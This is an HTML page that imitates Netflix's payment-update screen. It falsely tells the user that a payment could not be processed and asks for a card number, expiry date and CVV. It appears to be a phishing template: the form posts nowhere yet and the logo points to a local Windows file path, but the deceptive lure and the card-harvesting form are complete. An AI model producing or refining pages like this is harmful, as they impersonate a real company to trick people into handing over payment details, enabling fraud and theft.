<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Update Payment Details - Netflix</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
        }
        .container {
            width: 100%;
            max-width: 700px;
            margin: 0 auto;
            padding: 30px;
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            margin-top: 100px;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .header img {
            width: 150px;
            margin-bottom: 5px;
        }
        .heading {
            color: #E50914;
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .subheading {
            font-size: 18px;
            color: #333;
            line-height: 1.6;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            font-size: 14px;
            color: #333;
            display: block;
            margin-bottom: 5px;
        }
        .form-group input {
    width: 100%;
    padding: 8px; /* Reduced padding */
    border: 1px solid #ddd;
    border-radius: 4px;
    font-size: 14px; /* Reduced font size */
    background-color: #fafafa;
}

        .form-group input:focus {
            border-color: #E50914;
            outline: none;
        }
        .button {
            display: inline-block;
            background-color: #E50914;
            color: white;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 5px;
            text-decoration: none;
            width: 100%;
            max-width: 300px;
            text-align: center;
            margin-top: 20px;
            margin-left: auto;
            margin-right: auto;
        }
        .button:hover {
            background-color: #b4070a;
        }
        .footer {
            text-align: center;
            font-size: 12px;
            color: #999;
            margin-top: 30px;
        }
        .footer a {
            color: #E50914;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <!-- Netflix logo -->
            <img src="C:\Users\dell\OneDrive\Desktop\New folder\Netflix_Logo.png" alt="Netflix Logo">
            <h1 class="heading">Update Your Payment Details</h1>
        </div>
        <div class="subheading">
            <p>Your payment details are outdated, and we are unable to process your latest payment. Please update your payment method to continue enjoying Netflix.</p>
        </div>
        <form action="#" method="POST">
            <div class="form-group">
                <label for="credit-card">Credit or Debit Card Number</label>
                <input type="text" id="credit-card" name="credit-card" placeholder="Enter your card number" required>
            </div>
            <div class="form-group">
                <label for="expiry-date">Expiry Date (MM/YY)</label>
                <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/YY" required>
            </div>
            <div class="form-group">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" name="cvv" placeholder="Enter your card's CVV" required>
            </div>
            <!-- Submit Button -->
            <button type="submit" class="button">Update Payment Details</button>
        </form>
        <div class="footer">
            <p>Need help? <a href="#">Contact Netflix Support</a></p>
        </div>
    </div>
</body>
</html>
